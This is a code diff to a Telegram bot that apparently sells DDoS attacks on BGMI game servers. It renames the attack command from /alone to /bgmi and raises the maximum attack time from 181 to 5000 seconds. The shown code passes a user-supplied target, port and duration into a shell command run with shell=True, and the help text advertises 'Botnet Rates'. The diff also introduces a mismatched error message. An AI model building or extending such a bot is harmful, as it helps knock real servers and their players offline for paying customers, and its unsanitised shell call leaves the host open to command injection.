@@ -216,7 +216,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['alone'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -224,7 +224,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /alone Command Again."
+                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -235,8 +235,8 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 5000:
+                response = "Error: Time interval must be less than 4000."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
@@ -245,7 +245,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /alone <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
         response = "❌ You Are Not Authorized To Use This Command ❌."
 
@@ -277,7 +277,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /alone : Method For Bgmi Servers. 
+💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
